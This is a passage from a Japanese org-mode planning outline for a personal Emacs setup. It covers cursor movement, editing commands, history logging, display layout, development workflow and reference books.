	 http://www.emacswiki.org/emacs/MovingTheCtrlKey
	 https://gitorious.org/at-home-modifier/pages/Home
	 https://github.com/benhansenslc/BigCtrl
*** 7. Cursor Move
   :PROPERTIES:
   :CUSTOM_ID: Cursor Move
   :END:

最速の移動がスピードコーディングの肝となる。
目で見ているところへ移動が一番理想的

- linum-mode で 4 行ずつに色を付け C-u C-k で移動する。
  C-u を押すとカーソル位置から基準に上下の色を消してい
  く。論理行も考慮する必要あり。

- 論理行で移動

- 色で移動

- [[#point][point history]]

**** 6.1. check point

- save した位置を記録
  fringe に表示

- 最後に編集した位置へ移動

- 位置のレジスタ

- bookmark bm.el

**** 6.2. keyboard rate

Repeat 速度 を変更

**** 6.3. Each char or line move

- 長押しで each char から each word に変換
  20 回 char move してから each word に

**** 6.4. Each word
**** 6.5. Each symbol
**** 6.6. Sequential Move

連続した移動

- Sequential Backward
  line の indent 先頭に移動。
  indent の先頭なら line の先頭に移動。
  line の先頭で Column が記録されていれば Column を Clear 。
  line の先頭で Column が記録されていなければ window の先頭に移動。
  window の先頭なら buffer の先頭に移動。
  buffer の先頭なら元の位置へ移動。
  univarsal-argument 4 で元の位置へ移動。
                     8 で line の先頭へ移動
                     12 で window の先頭へ移動。
                     16 で buffer の先頭へ移動。

- Sequential Forward
  sufix coment があればコメントを無視した line の末尾に移動。
  現在のポイントがコメントを無視した末尾なら window の末尾に移動。
  window の末尾なら buffer の末尾に移動。
  buffer の末尾なら元の位置へ移動。
  univarsal-argument 4 で元の位置へ移動。
                     8 で line の末尾へ移動
                     12 で window の末尾へ移動。
                     16 で buffer の末尾へ移動。

**** 6.7. move bind now

- 利用中
"C-j"
"C-k"
"C-l"
"C-n"

"M-j"
"M-l"

"C--"
"C-h"

"C-M-k"
"C-M-n"

----
- 検討中
"M-k"
"M-n"
"M-h"
"M--"

"C-M-j"
"C-M-l"
"C-M--"
"C-M-h"

----

*** 8. Editing
    :PROPERTIES:
    :CUSTOM_ID: Editing
    :END:

**** 7.1. 範囲 (region, narrowing)
***** 7.1.1 Mark
- mark-word
  mark-sexp
  mark-paragraph
  mark-defun
  mark-page
  mark-whole-buffer


- mark-ring, Global Mark Ring

- region の復元

- region したまま buffer の最後 で next-line しても region を解除させない

- word symbol string line list defun paragraph window whole-buffer color


****** Shift Selection
- space as control

****** Expand region

command 連打で状況に応じて region を広げる。
  word の先頭以外なら word を region
  word の先頭なら space x 2 で symbol 全体を region (global-set-key)
  word symbol ""() 内 ""() 外 line defun window buffer
  overlay の利用も検討

Shift + Space = cursol から end-of-line まで region

****** Multi region

region を複数 選択しそれぞれにコマンドを実行する。
http://www.emacswiki.org/emacs/ApplyFunctionOnMultipleRegions

- 数行 ずつ region する。

- 重複する行を region する。

****** Rectangle
- sense-region.el
- rectangle のまま forward-word などの移動コマンド
- rectangle expand symbol paragraph 内 defun 内

***** 7.1.2 Narrowing

- <number> line ずつ narrowing する。

***** 7.1.3 Protect region

copy kill を block する。
block したところは overlay 。
block した word,symbol を含めてコピーした場合、 block した
範囲を取り除いて kill-ring する。
また、 font-lock 別でも block できるようにする。

**** 7.2. 対象 (word symbol paragraph)
***** 7.2.3. Search

- 検索時の大文字小文字の区別
- 検索履歴による再検索

****** 正規表現 template
****** Regexp
****** Fuzzing Match
-  曖昧検索 ― approx-search

****** Across file

**** 7.3. 操作 (delete copy paste etc)

- copy と kill を統合
  copy コマンドした後にもう一度同じコマンドを実行したら 以前
  の範囲を kill する。

***** 7.3.1. Copy

Clipboard kill-ring に挿入

- Copy Without Selection

- Copy whole line

- Edit Copyed text

****** Clipboard Action

clipboard を監視し文字列によってアクションを起す。
clipboard に入れられた文字数、行数をみる。

***** 7.3.2. Killing, Deleting

clipboard: kill した時のみ挿入
kill-ring: すべて挿入

統合
Minibuffer で削除したものは clipboard に挿入しない。
kill-ring には挿入。

- 行頭・行末の空白文字を削除
- 行単位で間引く
- [[#kill-ring][kill-ring history]]

- delete-blank-lines

- kill した text の位置、 buffer を記録。

- whitespace
  + fix-whitespace just-one-space
    コマンド統合。もし whitespace が 2 つあれば 1 つにし、
    1 つであれば word を join する。

- toggle delete command

C-u command = shift backspace
and lastcommand memq delete command backspace repeat shift backspace

- delete prefix

delete prefix key を押した後の移動コマンドで削除

***** 7.3.3. Paste, Yanking

- paste は全て clipboard から行う。
- paste したら indent を自動で行う
- overwrite paste
- 貼り付け位置を先に指定 ― fcopy


****** duplicate

+ Moccur で line, defun, paragraph を duplicate する。
+ duplicate-line を yasnippet で使える用にする
+ duplicate-line で yank-pop する

***** 7.3.4. Replace

****** Rotate text

*Rotate text command*
|------+-----+-------|
| Ture | <=> | False |
| Yes  | <=> | No    |
| t    | <=> | nil   |
|------+-----+-------|


******* Spell check
******* 誤った文字順の修正
****** Grammar checking
****** 大文字 <=> 小文字

- 大文字 <=> 小文字

  + Cursor 下を toggle

- 小文字 => 大文字

  + 文字の先頭を大文字にする。

    * 1Word の先頭を変換
    * region があれば region 内を変換
    * prefix 付き [保留]
    * eq last-command であれば小文字にする。

  + symbol 全体を大文字にする。

    * cursor 位置どこでも symbol 全体を大文字にする。
    * region があれば region 内を全て大文字にする。
    * prefix 付き [保留]
    * eq last-command であれば小文字にする。

- 大文字 => 小文字

  + 文字の先頭を小文字にする。

    * 1word の先頭を変換
    * region があれば region 内を変換
    * prefix 付き [保留]
    * eq last-command であれば大文字にする。

  + symbol 全体を小文字にする。

    * cursor 位置どこでも symbol 全体を小文字にする。
    * region があれば region 内を全て小文字にする。
    * prefix 付き [保留]
    * eq last-command であれば大文字にする。

- downcase-word, upcase-word, capitalize-word,
  downcase-region, upcase-region

****** 全角 <=> 半角

- 全角 <=> 半角

  + Cursor 下を toggle

- 全角 => 半角

  + Cursor 位置どこでも symbol 全体を半角にする。
  + region があれば region 内を全て半角にする。
  + prefix 付き [保留]
  + eq last-command であれば全角にする。

- 半角 => 全角

  + Cursor 位置どこでも symbol 全体を全角にする。
  + region があれば region 内を全て全角にする。
  + prefix 付き [保留]
  + eq last-command であれば半角にする。

****** 改行コード [保留]
****** tab <=> space
****** Header

書込み時に自動で header を更新

***** 7.3.5. Fixing
****** Spelling
****** Transpose
- char
- word
- symbol
- line
- function
- reverse-words

- イコール記号「=」の左辺と右辺を一括して入れ替える
- region を起点にして入替
  + "foundSpace == True"
    "True == foundSpace"
    "==" に region を設定した場合

- multi-region を使って 2 つの region を入替
- rectangle

***** 7.3.6. Parentheses

- 閉じ括弧で indent
- 自動で対応した括弧を挿入

***** 7.3.7. Numbering
****** Renumber

連番挿入

****** Increment Number

region 内の 数字を Increment
region がなければ buffer の数字を increment

****** Visible Number

数字４桁づつにコンマを挿入 "1,000"

***** 7.3.8. Sort

region 内を Sort
list 内を Sort
rectangle 内を基準に line を Sort

- alphabet
- number
- 五十音順
- 長さ順
- reverse

***** 7.3.9. Comments
****** Toggle Comment Uncomment
****** Header / Document

- find-file file を新規作成時に template を挿入
  + file name
  + Copyright
  + Commentary
  + change log
  + (defvar auto-document-version "$Id: auto-document.el,v 1.16 2010/05/04 09:00:52 rubikitch Exp $")

- save-before-file file 名 などを update
  header2.el

- 関数名 変数 の index を header に挿入

***** 7.3.10. Alignment

- 文章を右揃え・中央揃えに整形する
- 空白文字で分割して整形。各フィールドは左揃え。
- 空白文字で分割して整形。各フィールドは右揃え。
- 空白文字で分割して整形。ダブルクォートで囲まれたフィールドをサポート。各フィールドは左揃え。
- 指定したセパレータで分割して整形。各フィールドは左揃え。
- 指定したセパレータで分割して整形。各フィールドは右揃え。
- 行末のバックスラッシュの位置の整形。シェルスクリプト用。
- 複数の変数を一度に宣言していたら、その宣言を 1 行ずつの変数宣言に変換する。
- 小数点の位置で数値を整形。

****** Indent

***** 7.3.11. Insert template
****** Date

- 日付挿入

****** File name

- my-insert-file-name

****** License
****** autoinsert
****** Snippet Code
******* yasnippet
******* function or class source code
****** auto-complete

ac-sources kill-ring

****** Regexp

anything などで説明付きの正規表現を選んで insert する。
yasnippet 化する。

*正規表現 template*
|-------+--------|
| thing | regexp |
|-------+--------|
| ipv4  |        |
| ipv6  |        |
|-------+--------|

***** 7.3.12. 上書きモード（ Ovwrt モード）
*** 9. History
   :PROPERTIES:
   :CUSTOM_ID: History
   :END:

徹底的に履歴を作る。
履歴から統計をとりやすくし改善に役立てる。

**** 8.1. Running Time
    :PROPERTIES:
    :CUSTOM_ID: Running time
    :END:

起動、終了時刻を記録。
統計に使えるようにする。
[[#Emacs.log][Start & Exit log]]

**** 8.2. Undo Redo

- undo redo を file ごとに disk に保存する。
  undohist.el

*<file-name>_undo.el*
|-----------+------------------------|
| File name | <file-name>_undo.el    |
| Location  | ~/.emacs.d/var_e/undo/ |
|-----------+------------------------|
| Format    |                        |
|-----------+------------------------|

***** region 内のみ undo
***** save した時点を一句切とし bookmark の様に其の時点まで undo, redo する。
***** 編集履歴の見える化

- undo-tree

**** 8.3. Kill-ring
    :PROPERTIES:
    :CUSTOM_ID: kill-ring
    :END:

- auto-save kill-ring-save
kill ring を crash 対策で disk に保存
[[#var_e][kill-ring-save.el]]

- kill-ring.log
kill-ring をすべて保存
[[#Emacs.log][kill-ring.log]]

保存された kill-ring から文字列を検索

**** 8.4. Command
***** Define Macro
****** マクロの編集
****** マクロリング
****** マクロにキーを割り当てる
****** macro region
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=macros-plus

**** 8.5. Find-file
    :PROPERTIES:
    :CUSTOM_ID: find-file-history
    :END:

[[#Emacs.log][Open Save Close log]]

- recentf
  + timestamp

- Journal

**** 8.6. Window
    :PROPERTIES:
    :CUSTOM_ID: window history
    :END:

- undo の見える化
  visual 的に undo する。
  artist mode で作成されたような線で書かれた window の
  配列を anything のようなインターフェースで選択し undo
  する。

**** 8.7. Point
    :PROPERTIES:
    :CUSTOM_ID: point
    :END:

- Saved file cursor point

- 迷子対策
  undo redo point
  もっとざっくりと移動したい
  line ごとで移動
  若しくは、可視化したい
  undo redo point の間、 overlay する。
  最後の region に移動

**** 8.8. Help Document
[[programming%20document%20history][Programming Document]]

**** 8.9. Minibuffer complete history
    :PROPERTIES:
    :CUSTOM_ID: minibuffer history
    :END:

- zsh 風
- 先頭文字の一致する M-x ヒストリを辿る
- session.el

**** 8.10. Changelog
- Subversion と連携
  Changelog に記載時に header, Changelog に記載。そして、
  commit log にも反映できるようにする。

- Changelog template

*** 10. Display
   :PROPERTIES:
   :CUSTOM_ID: Face
   :END:

速度、機能優先。
見た目は重要だが最重要ではない。

**** 9.1. Frame

デュアルディスプレイでない限りは Frame は 1 つ以上作らない

- Toggle bar
  menu-bar scroll-bar vertical-scroll-bar をまとめて toggle
  http://www.emacswiki.org/emacs/FullScreen


***** 新しいフレームの作成
***** Frame の移動

Frame の表示位置をコマンドで切り換える
テンキーの配列を利用する。

***** Frame 削除と最小化
***** 最大化

Frame の title を最大化時は nil にする。
最大化時、 frame の縁をなくす

- windows emacs-fullscreen.exe

***** 透過

- 一時的に全ての文字を消す。
  透過モードでバックグラウンドの文字を見るため

**** 9.2. Window
;; line を切り捨て表示
(setq truncate-lines nil)


***** Split

- 移動先に window がなければ split して作成。
- 分割禁止 window 設定
- 決った形に分割
  + 使用状況にあわせて切替
  + follow-mode
  + view-mode
  + coding-mode
  http://www.bookshelf.jp/soft/meadow_30.html#SEC414

***** Delete

- 意図した window を削除。
  番号を選んで削除。
- 現在の window を削除
- 他の window を削除
- 他の全ての window を削除

***** Change

- 意図した大きさになるのが理想
- acejump のようにコマンド後に overlay で目標となる位置
  を表示して選ぶ。拡大／縮小する時に座標を表示する。
  中心などがわかりやすいようにする。
- interactive に拡大／縮小
- mouse で拡大／縮小
- 横幅を 80 にする。

***** Translate Window

- 容易に意図した window のみを入替
- 番号を選択して入替
- interactive に入替
- window buffer の入替
  + http://www.emacswiki.org/emacs/ToggleWindowSplit

***** Popup

- 特定の window を popup で表示する。

***** Undo Redo

[[#window%20history][Window Undo Redo]]

***** Handling
***** Multi window

- multi cursor で編集
  複数の window で同時に編集
  http://www.emacswiki.org/emacs/RecursiveEditPreservingWindowConfig

**** 9.3. Scrolling

- Recenter
- cursor の位置を window の top へ scroll
- 他の window を scroll
- http://www.emacswiki.org/emacs/Scrolling
- page 分割があれば page に合せる。
- what-page
- Horizontal scrolling

**** 9.4. Fringe
- 行番号を左に表示
  4 行ずつに色を付ける。
- 行の折り返し表示を変更する
**** 9.5. Mode-line

| Current Line | Max Line | , | Column | Coding Style | Buffer name | Modify | Remote | minor mode |

- 状況に応じて mode-line の表示を変える。
  余り表示の必要のない buffer には表示を最小限にとどめる。
  - mode-line を隠す

- auto-save, vc の状況を表示

- Color

  + view-mode なら赤系
  + 書込み可能なら緑系
  + 編集されたら文字の色を変える。

- history 情報表示
  + undo redo
  + winner undo redo
  + point undo redo
  + last-command

- 文字数を数える

- Minor mode 表示

  + 4 文字以内が適当

- notePC ならバッテリーの残量を表示

- 時間の表示を考える (締切などを考慮して)

- ファイル名がかぶった場合にバッファ名をわかりやすくする。

- 編集すれば mode-line-buffer-id の色を変更。

- universal-argument を count する。

**** 9.6. Cursor

- Change cursor 日本語

- x-stretch-cursor t
  tab 上にある時に cursol がのびる。

**** 9.7. Font

| Main English Font  | Ricty  |
| Main Japanese Font | Ricty  |
| Sub English Font   | mono   |
| Sub Japanese Font  | Gothic |

.emacs.d/ に ricty があるのでそこから読むようにする。
ricty の i l 1 を見間違えないように改造する
*Message* に使用 font を記載。

***** フォントの横幅を調節する
***** 文字サイズ 変更
text-scale-increase text-scale-decrease

**** 9.8. Syntax Color

[[info:emcas%2018.8%20Font%20Lock%20mode][info emacs]] 18.8 Font Lock mode
info emacs 18.9 Interactive Highlighting

     (add-hook 'c-mode-hook
               (lambda ()
                (font-lock-add-keywords nil
                 '(("\\<\\(FIXME\\):" 1 font-lock-warning-face t)))))

   To remove keywords from the font-lock highlighting patterns, use the
function `font-lock-remove-keywords'.  *Note Search-based
Fontification: (elisp) Search-based Fontification.



***** フォントロックのフェイスで動作を変える

*** 11. Help
**** Documment ref
- langhelp http://jp.rubyist.net/magazine/?0017-langhelp

**** Algorithm
**** man ページの表示
**** コード表 表示
**** python document
- import inspect

**** Info

- tab 化
- open link other buffer

*** 12. Develop
   :PROPERTIES:
   :CUSTOM_ID: Develop
   :END:
- コーディング
  スピード、正確さは相容れない関係である。
  スピードを優先すればコードは雑になり、正確さを優先すればス
  ピードが犠牲になる。
  この２つを両立する方法を考える。
  徹底的に自動化。
  テンプレートなどを使い入力補助をすることでスピードと正確さ
  を得る。
  其の為に、 PC のスペック、 HDD 、の容量を十分に取る必要がある。
  データベースを作成する。
  SSD を推奨。
  スピード、正確さ と 場所、お金のトレードオフである。
  また、締切前の 5 分と休日の 5 分とは価値が違う。
  この貴重な 5 分を手に入れる為の下準備に時間をかける必要がある。

**** Base Develop

- 操作性を統一
  help document などを参照する共通する command などは 同じ keybind にする。

- オフラインコーディング

- リポジトリと連携

- 現在の関数名を常に表示する

- 関数のソースを挿入 関数のソースがあればソースを辿ってソー
  スコードを挿入する。

***** Lab
- テスト環境を整える。
- many buffer
- many directory
- many file
  ランダムな文字列で構成される任意サイズのファイルを複数個生成
  プログラムのテストなどで、任意サイズのファイルが必要な場合
  や、ランダムな文字列が大量に必要な場合などに活用。
  1. テキストデータ (ランダムな英数字のみで構成)
  2. バイナリデータ (制御文字も含むランダムなバイナリデータで構成)
  3. ゼロ (NULL 文字のみで構成)

- sample text
| English  | William Shakespeare |
| Japanese | 夏目漱石            |
| Eng & Ja |                     |

***** project 管理
eproject
test directory 作成
directory
project ごとの TODO 管理
project ごとの coding style
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=pbf
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=indent-tabs-maybe
- source に TODO: を書き emacs で管理する
  project ごとに org file を作成する。
  TODO: を insert するコマンド
  TODO: を before-save で拾って buffer で管理する。
  行数と file 名の link を貼る。
  http://d.hatena.ne.jp/shunsuk/20100612/1276345829

- directory
  + Docs
  + Media
  + Sourccce
  + Obj
  + Bin
  + Test

- ディレクトリごとに設定ファイルを用意する

  - ローカル変数をディレクトリ単位で設定
    http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dirvars

- find-file in project
  http://emacswiki.org/emacs/FindFileInProject

***** Policy

****** 変数

- 変数名を命名規則に従う。

****** 関数

- 関数は、処理を行うか、応答を返すかの
  どちらかを行うべきで、両方を行ってはなりません。
  関数の第一規則は、小さくせよ。第二の規則は、さらに小さくせよ、です。
  20 行を超えるような関数はほとんどあってはなりません。

****** 条件文

- 条件文は if a == 1: と書かない。 この場合 if 1 == a: とする。
  if a = 1: と打ち間違った場合、エラーが表示されるようにする。

***** Default Coding Style

- プログラミング規約 の確認、制定 syntax rule に反映。
  規約用の変数を定義した関数を作成し add-hook で設定できるよ
  うにする。関数名の例、
  "emacs_lisp_codingstyle"
  コーディング規約を定める目的は、主に複雑さを緩和することである。
  また、簡単に参照できるようにする。

****** タブ幅
****** タブをスペースに変更
****** パラグラフのインデント
***** Change Log
***** Tags
***** Documentation Lookup
- info
- man

***** Comments
***** Completion

***** Window
- Project Explorer
- Console
- Task
- Outline
- Bookmark
- History
- Document
- Web
#+BEGIN_EXAMPLE
Coding
+---------------------------------------------------------------------------+
|-------------- tab -----------------|                                      |
|                                    |                                      |
|                                    |                                      |
|      Source Code                   |    Web, Document, other source       |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    |                                      |
|                                    +--------------------------------------+
|                                    |--------------- tab ------------------|
|                                    |   outline,Bookmark,History           |
|                                    |   Project explorer                   |
|------------------------------------+   Task,                              |
| +POPUP                             |                                      |
|   console, anything                |                                      |
|                                    |                                      |
+------------------------------------+--------------------------------------+

Code reading

+------+--------------------------------+-----------------------------------+
|      |                                |                                   |
|  O   |                                |                                   |
|  U   |    source code                 |    follow-mode                    |
|  T   |                                |                                   |
|  |   |                                |                                   |
|  L   |                                |                                   |
|  I   |                                |                                   |
|  N   |                                |                                   |
|  E   |                                |                                   |
|      |                                |                                   |
|      |                                |-----------------------------------+
|      |                                |                                   |
|      |                                |    documment                      |
|      |                                |                                   |
|      |                                |                                   |
|      +--------------------------------+                                   |
|      |                                |                                   |
|      | +POPUP                         |                                   |
|      |   anything                     |                                   |
|      |                                |                                   |
+------+--------------------------------+-----------------------------------+

Over view

+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+---+
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
|     |     |     |     |     |     |     |     |     |     |     |     |   |
+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+---+

Debug

#+END_EXAMPLE

**** Cycle

この流れを自動化

***** Code Reading
source を一つに纏め word などで俯瞰する。
  text-scale-increase
  follow-mode を使って実現
changelog を効率よく読む
変数の状態表示
関数が定義されている file と line number の表示
document 表示
coding の際に重くなる支援機能は view-mode で切り換える。

****** Jump Junction

- cscope
- etags http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=etags
****** Document
******* 簡易表示

# Document 統合計画
# 番号順に辿っていく

1) ElDoc

Source の Document を minibuffer に表示。

2) Help Document

ElDoc に表示されている symbol を Help
Source の Documment を表示。
symbol-at-point で一致すれば direct に表示。
なければ、 anything 起動。
Umemo で書込み。訪問回数記録。
Umemo には example code を自動で残す。
Info への Link
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=mode%20info
Source への Link (file の full path を表示)
web 検索ページへの Link

3) Cheat Sheet

org
pdf
image
html

******* 詳細表示

1) HTML

- Offline
- Online
Default
  + English
  + Japanese

2) Info

Symbol-at-point と anything-c-source-info は別コマンドに
Default は English で検索。
見ている Node から English と Japanese を toggle 。
Info に書込み。
Info node 訪問回数記録。
  + English
  + Japanese

3) rfc

Default は英語で表示。
見ている txt から 英語 と日本語を 切り換える。
rfc に memo を残す。
rfc 訪問回数記録。
定期的に update
  + English
  + Japanese
http://www.emacswiki.org/emacs/Irfc

******* Document History
       :PROPERTIES:
       :CUSTOM_ID: programming document history
       :END:

- info
- help
- 訪問回数
- timestamp

******* Search Document

apropos の様に Document の中から使えそうな関数、変数、 Class を探す。

****** symbol list
- 関数一覧 http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=etags
***** Edit Source
****** Code navigation
- 自動補完
- リアルタイムにプログラミング言語の文法チェックをする
****** snippet
- 雛形を用意し file 作成時に対話的に選ぶ。選び終った時点で 3 割
  程コーディングが済んでいると望ましい。
- 過去に書いた code などをデータベース化。さらに参照しコピペし
  て使えるようにする。
  言語
  場所
  サブフォルダ
  説明
  tag
  moccur
  license
# コード スニペットを使用すると開発時間が短縮されるため、
# アプリケーションの構築時にスニペットが頻繁に再使用されることがあります。
# そのため、スニペットに保存されるモデル コードは、
# セキュリティの問題に対処するようにデザインされている必要があります。
# 開発チームでは、一般的なセキュリティ標準に準拠しているかどうかについて、
# コード スニペットをレビューする手順を確立してください。

- Online search
****** Changelog
自動生成
file の changelog
project なら project 全体の changelog
svn の comment に自動追加。
http://www.emacswiki.org/emacs/ChangeLog
****** refactoring

- 可読性を上げること

- ログ出力などで結果を分かりやすく表示すること

- save する前に linter など規則に沿った code に整形する。

******* 対応方法

- moccur-edit
****** Interpreter

- 入力内容を記録保存

***** Compile build

- compile のエラーログを保存
  エラーログの link を生成
  簡単な compile
  http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=yacompile
***** Run
***** Debug

****** コンパイルエラー
****** ランタイムエラー
****** 論理エラー
***** Profile
- 速度

**** Programming Languages

***** C C++
****** Coding Style
***** Emacs Lisp
****** Coding Style
****** Interpreter
******* scratch

- auto-save する crash に備える
- scratch で書いた内容を一つの file にまとめる。
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=save%20scratch
http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=delete%20scratch


***** Python
****** Coding Style
***** Assembly
****** Coding Style

*** 13. Advanced Features

**** Maintenance mode

- 何ども再起動しなくてよいものにする。

- crash したらクラッシュ原因を trace できるようにする。

***** Compile
***** Package 管理

- Check upgrade elisp

- load される lisp を調べる which.el
  http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=which%20lisp

- 使ってない elisp list up

- Conflicting Libraries
  http://www.emacswiki.org/emacs/ConflictingLibraries

***** Keybind
   :PROPERTIES:
   :CUSTOM_ID: Keybind Maintenance
   :END:

- 使ってない key bind を表示
  (describe-unbound-keys 5)
- keylog

***** 統計

- crash の頻度、間隔を測る
- comand
- keyloger
- 文章の出現頻度をカウント

***** Profile
http://www.emacswiki.org/emacs/ProfileDotEmacs
**** Registers
- better-registers.el http://www.emacswiki.org/emacs/better-registers.el
  Position
  Text
  Rectangle
  Configurations
  Numbers
  Files
  Bookmarks

**** Remote
    :PROPERTIES:
    :CUSTOM_ID: remote emacs
    :END:

    - Remote Machine file DB
      http://www.emacswiki.org/emacs/HoboMode
    - SSH
      http://emacswiki.org/emacs/TrampMode
    - FTP
      http://www.emacswiki.org/emacs/AngeFtp

      http://www.emacswiki.org/emacs/RemoteEmacs

**** Network
***** proxy
***** Web Browser
***** tramp
***** ftp
**** Shell
- scratch like の shell comand buffer を作成。
- zsh history anything
  http://d.hatena.ne.jp/tarao/20100429/1272509893

**** Printer
**** Scheduler
***** 時間管理ツール
***** カレンダの表示
***** ダイアリ機能
**** elisp で gui を自動操作。 auto hotkey のようなもの。
**** いろんなものを階層化して表示 ― ee
- http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=ee

**** こそっとエディタ
- minibuffer 並に小くし透過する。
**** 書き起こし
**** minimap
- http://www.emacswiki.org/emacs/MiniMap

**** Hex 入力補助
     - \x01\x02\x00

**** subdir 一覧を得る
     http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dirtree
	 http://www.bookshelf.jp/soft/meadow_25.html#SEC305

*** 14. Negative list
- chord で誤って command が実行されてしまう。
*** 15. Reference
**** 構成を考える上で参考にしたもの

cf. - [[http://www.bookshelf.jp/soft/meadow_toc.html]]
    - [[info:emacs][emacs info]]
    - [[info:elisp][elisp info]]
    - [[http://d.hatena.ne.jp/rubikitch/20100717/emacsbook][Emacs テクニックバイブル ～作業効率をカイゼンする 200 の技～』]]
    - [[http://d.hatena.ne.jp/rubikitch/20111120/elispbook][Emacs Lisp テクニックバイブル　～真髄を知る Lisp の掟～]]
    - [[http://gihyo.jp/magazine/wdpress/plus/978-4-7741-5002-4][Emacs 実践入門―思考を直感的にコード化し，開発を加速する]]
    - [[http://www.oreilly.co.jp/books/9784873112770/][入門 GNU Emacs 第 3 版]]
    - [[http://www.oreilly.co.jp/books/4900900931/][GNU Emacs デスクトップリファレンス]]
    - [[https://gihyo.jp/dp/ebook/2012/978-4-7741-5131-1#content][Vim テクニックバイブル　−作業効率をカイゼンする 150 の技]]
    - [[http://www.oreilly.co.jp/books/4873110831/][入門 vi 第 6 版]]
    - [[http://gihyo.jp/book/2010/978-4-7741-4396-5][vi/Vim コマンドポケットリファレンス]]

***** vi
1 章 テキストエディタ
        1.1 ファイルのオープンとクローズ
        1.2 編集をセーブせずに終了するには

2 章 基本的な編集作業
        2.1 vi のコマンド
        2.2 カーソルの動かし方
        2.3 簡単な編集
        2.4 テキストを入力するいろいろな方法
        2.5 J による 2 行の連結
        2.6 vi の基本コマンドのまとめ

3 章 素早くジャンプする方法
        3.1 画面単位でのジャンプ
        3.2 テキストブロック単位でのジャンプ
        3.3 検索によるジャンプ
        3.4 行番号によるジャンプ
        3.5 vi の移動コマンドのまとめ

4 章 vi の中級コマンド
        4.1 コマンドの組み合わせ
        4.2 vi の起動オプション
        4.3 バッファの活用
        4.4 位置のマーク
        4.5 もっと高度な編集作業について
        4.6 vi のバッファ/ マーク関連コマンドのまとめ

5 章 ex エディタ
        5.1 ex コマンド
        5.2 ex による編集
        5.3 ファイルのセーブと終了
        5.4 別のファイルの読み込み
        5.5 複数ファイルの編集

6 章 一括置換
        6.1 置換の確認
        6.2 文脈依存置換
        6.3 パターンマッチングルール
        6.4 パターンマッチングの実例
        6.5 パターンマッチングの完全マスター

7 章 vi の高度な使い方
        7.1 vi のカスタマイズ
        7.2 UNIX コマンドの実行
        7.3 キー入力節約用コマンド
        7.4 ex スクリプトの使い方
        7.5 ソースコードの編集

8 章 vim - vi Improved
        8.1 作者と歴史
        8.2 おもなコマンドライン引数
        8.3 オンラインヘルプとその他のドキュメント
        8.4 初期化
        8.5 マルチウィンドウ編集
        8.6 GUI インターフェイス
        8.7 拡張正規表現
        8.8 改善された編集機能
        8.9 プログラミング支援機能
        8.10 ユニークな特色
        8.11 対応するオペレーティングシステムとソースコード

付録 A クイックリファレンス

付録 B ex コマンド
        B.1 コマンド形式
        B.2 コマンド一覧（アルファベット順）

付録 C 環境オプション
        C.1 Solaris 2.6 vi のオプション
        C.2 vim 6.0 のオプション

付録 D 問題点のチェックリスト
        D.1 ファイルオープン時の問題点
        D.2 セーブ時の問題点
        D.3 ビジュアルモード時の問題点
        D.4 vi コマンドにまつわる問題点
        D.5 削除にまつわる問題点

付録 E vi と Internet
        E.1 vi 関連 Web サイト
索　引
***** vi pocket
1 章　 vi の起動と終了
2 章　基本カーソル移動
3 章　スクロール（改ページ）
4 章　高度なカーソル移動
5 章　文字列の検索
6 章　マーキング
7 章　文字入力
8 章　文字の削除
9 章　文字を書き換える
10 章　コピー＆ペースト
11 章　左右シフト
12 章　再実行とコマンドの取り消し
13 章　文字列の検索と書き換え/ 削除
14 章　外部コマンドを実行
15 章　複数のファイルに渡る編集
16 章　 vi のカスタマイズ
17 章　そのほかの ex コマンド
Appendix
***** emacs oliry
監訳者まえがき
はじめに

1 章　 Emacs 入門
	1.1 　 Emacs へようこそ！
	1.2 　ファイルとバッファ
	1.3 　モードについて
	1.4 　 Emacs の起動
	1.5 　 Emacs の画面
		1.5.1 　ツールバー
		1.5.2 　メニュー
		1.5.3 　モードライン
		1.5.4 　ミニバッファ
	1.6 　 Emacs コマンド
	1.7 　ファイルを開く
		1.7.1 　間違ったファイルを開いたら
		1.7.2 　ファイル名の補完
		1.7.3 　ファイルの挿入と追加
		1.7.4 　デフォルトディレクトリの決め方
	1.8 　ファイルの保存
	1.9 　 Emacs の終了
	1.10 　ヘルプの表示
		1.10.1 　［ Help ］メニュー
	1.11 　まとめ
		1.11.1 　起こりがちな問題

2 章　テキストの編集
	2.1 　カーソルの移動
		2.1.1 　その他のカーソル移動方法
		2.1.2 　画面単位（またはそれ以上）でのカーソル移動
		2.1.3 　コマンドの繰り返し
		2.1.4 　表示のセンタリング
